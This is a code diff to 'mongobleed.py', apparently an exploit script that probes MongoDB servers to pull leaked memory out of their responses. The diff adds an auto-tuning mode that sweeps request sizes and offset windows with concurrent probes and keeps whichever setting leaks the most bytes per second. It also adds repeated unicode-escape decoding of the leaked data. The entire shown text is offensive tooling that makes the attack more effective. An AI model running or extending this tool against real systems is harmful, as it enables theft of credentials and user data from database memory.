@@ -18,6 +18,7 @@ import os
 import re
 import socket
 import struct
+import time
 import zlib
 
 from rich.console import Console
@@ -27,6 +28,7 @@ FIELD_NAME_RE = re.compile(rb"field name '([^']*)'")
 TYPE_RE = re.compile(rb"type (\d+)")
 URL_ENC_RE = re.compile(r"%[0-9A-Fa-f]{2}")
 UNICODE_ESC_RE = re.compile(r"\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2}|\\[nrt\"\\\\]")
+ESCAPE_SEQ_RE = re.compile(r"(\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2}|\\[nrt\"\\\\])")
 BASE64_RE = re.compile(r"^[A-Za-z0-9+/]+={0,2}$")
 SIZE_RE = re.compile(r"^\s*(\d+)\s*(kb|mb)?\s*$", re.IGNORECASE)
 
@@ -101,6 +103,7 @@ def main():
         "  python3 mongobleed.py --host <target> --loop\n"
         "  python3 mongobleed.py --host <target> --loop --max-empty-passes 3\n"
         "  python3 mongobleed.py --host <target> --loop --timeout 3 --workers 200\n"
+        "  python3 mongobleed.py --host <target> --auto\n"
         "  python3 mongobleed.py --host <target> --dump 10MB\n"
         "  python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048\n"
         "  python3 mongobleed.py --host <target> --dump 512KB --preview-bytes 4096 --decode\n"
@@ -123,7 +126,11 @@ def main():
     parser.add_argument('--loop', action='store_true', help='Keep looping until stopped')
     parser.add_argument('--decode', action='store_true', help='Try to decode URL, unicode escapes, and base64')
     parser.add_argument('--dump', help='Target claimed size, e.g. 10MB or 512KB')
-    parser.add_argument('--dump-window', type=int, default=0, help='Probe +/- N bytes around dump size')
+    parser.add_argument('--dump-window', type=int, default=0, help='Probe +/- N bytes around dump size (0=auto)')
+    parser.add_argument('--auto', action='store_true', help='Auto-tune dump size/window for best yield')
+    parser.add_argument('--auto-min', default='64KB', help='Min size for auto sweep (e.g., 64KB)')
+    parser.add_argument('--auto-max', default='10MB', help='Max size for auto sweep (e.g., 10MB)')
+    parser.add_argument('--auto-samples', type=int, default=8, help='Samples per config in auto sweep')
     parser.add_argument('--output', default=None, help='Output file (default: auto-generated)')
     args = parser.parse_args()
 
@@ -186,6 +193,21 @@ def main():
                 out.append(f"\\u{code:04x}")
         return "".join(out)
 
+    def escape_count(text):
+        return len(ESCAPE_SEQ_RE.findall(text))
+
+    def iterative_unicode_unescape(text, rounds=2):
+        decoded = text
+        for _ in range(rounds):
+            try:
+                next_decoded = codecs.decode(decoded, "unicode_escape")
+            except Exception:
+                break
+            if next_decoded == decoded:
+                break
+            decoded = next_decoded
+        return decoded
+
     def decode_variants(data, limit):
         variants = []
         ascii_text = data.decode("ascii", errors="ignore")
@@ -201,9 +223,13 @@ def main():
 
         if UNICODE_ESC_RE.search(ascii_text):
             try:
-                decoded_text = codecs.decode(ascii_text, "unicode_escape")
+                decoded_text = iterative_unicode_unescape(ascii_text, rounds=2)
                 cleaned = render_clean_text(decoded_text)
-                if is_mostly_printable(cleaned):
+                improved = (
+                    escape_count(cleaned) < escape_count(ascii_text)
+                    or printable_ratio(cleaned) > printable_ratio(ascii_text) + 0.1
+                )
+                if improved and is_mostly_printable(cleaned):
                     variants.append("esc:" + truncate_text(cleaned, limit))
             except Exception:
                 pass
@@ -221,14 +247,15 @@ def main():
         return variants
 
     def decode_from_preview(preview, limit):
-        try:
-            decoded = codecs.decode(preview, "unicode_escape")
-        except Exception:
-            return None
+        decoded = iterative_unicode_unescape(preview, rounds=2)
         cleaned = render_clean_text(decoded)
         if len(cleaned) > limit:
             cleaned = truncate_text(cleaned, limit)
-        if printable_ratio(cleaned) > printable_ratio(preview):
+        improved = (
+            escape_count(cleaned) < escape_count(preview)
+            or printable_ratio(cleaned) > printable_ratio(preview) + 0.1
+        )
+        if improved:
             return cleaned
         return None
 
@@ -248,14 +275,106 @@ def main():
             return amount * 1024 * 1024
         return amount
 
-    if args.dump:
-        target = parse_size(args.dump)
-        window = max(0, args.dump_window)
+    def auto_window_for_size(size):
+        return max(1024, min(65536, size // 2048))
+
+    def build_windows(size):
+        candidates = [0, auto_window_for_size(size), 1024, 4096, 16384, 65536]
+        uniq = sorted({w for w in candidates if w >= 0})
+        return [w for w in uniq if w == 0 or w < size]
+
+    def sample_offsets(size, window, samples):
+        if window <= 0:
+            return [size]
+        start = max(0, size - window)
+        end = size + window
+        if samples <= 1:
+            return [size]
+        step = max(1, (end - start) // (samples - 1))
+        offsets = list(range(start, end + 1, step))
+        if size not in offsets:
+            offsets.append(size)
+        return sorted(set(offsets))
+
+    if args.auto:
+        try:
+            min_size = parse_size(args.auto_min)
+            max_size = parse_size(args.auto_max)
+        except ValueError as exc:
+            console.print(f"[bold red][!][/bold red] {exc}")
+            return
+        if min_size <= 0 or max_size <= 0 or max_size < min_size:
+            console.print("[bold red][!][/bold red] Invalid auto size range.")
+            return
+
+        sizes = []
+        size = min_size
+        while size <= max_size:
+            sizes.append(size)
+            size *= 2
+        if sizes[-1] != max_size:
+            sizes.append(max_size)
+
+        best = None
+        console.print("[bold cyan][*][/bold cyan] Auto-tuning dump size/window...")
+        for size in sizes:
+            for window in build_windows(size):
+                offsets = sample_offsets(size, window, args.auto_samples)
+                t0 = time.perf_counter()
+                leaks_found = set()
+                leak_bytes = 0
+                with concurrent.futures.ThreadPoolExecutor(
+                    max_workers=min(args.workers, len(offsets))
+                ) as executor:
+                    futures = [
+                        executor.submit(send_probe, args.host, args.port, off, off, args.timeout)
+                        for off in offsets
+                    ]
+                    for future in concurrent.futures.as_completed(futures):
+                        leaks = extract_leaks(future.result())
+                        for data in leaks:
+                            if data not in leaks_found:
+                                leaks_found.add(data)
+                                leak_bytes += len(data)
+                elapsed = max(0.001, time.perf_counter() - t0)
+                score = leak_bytes / elapsed
+                if leak_bytes > 0:
+                    console.print(
+                        f"[bold cyan][*][/bold cyan] size={size} window={window} "
+                        f"leaks={len(leaks_found)} bytes={leak_bytes} score={score:.1f}"
+                    )
+                if best is None or score > best["score"]:
+                    best = {
+                        "size": size,
+                        "window": window,
+                        "score": score,
+                        "leak_bytes": leak_bytes,
+                        "leaks": len(leaks_found),
+                    }
+
+        if best is None or best["leak_bytes"] == 0:
+            console.print("[bold red][!][/bold red] Auto-tune found no leaks.")
+            return
+
+        target = best["size"]
+        window = best["window"]
         args.min_offset = max(0, target - window)
         args.max_offset = target + window + 1
         args.buffer_extra = 0
-        args.loop = False
-        args.max_empty_passes = 1
+        console.print(
+            "[bold green][+][/bold green] Auto-tune selected "
+            f"size={target} window={window} leaks={best['leaks']} bytes={best['leak_bytes']}"
+        )
+
+    if args.dump and not args.auto:
+        target = parse_size(args.dump)
+        if args.dump_window == 0:
+            window = max(1024, min(65536, target // 2048))
+        else:
+            window = max(0, args.dump_window)
+        args.min_offset = max(0, target - window)
+        args.max_offset = target + window + 1
+        args.buffer_extra = 0
         if window:
             console.print(f"[bold cyan][*][/bold cyan] Dump mode: {target} bytes (window +/- {window})")
         else:
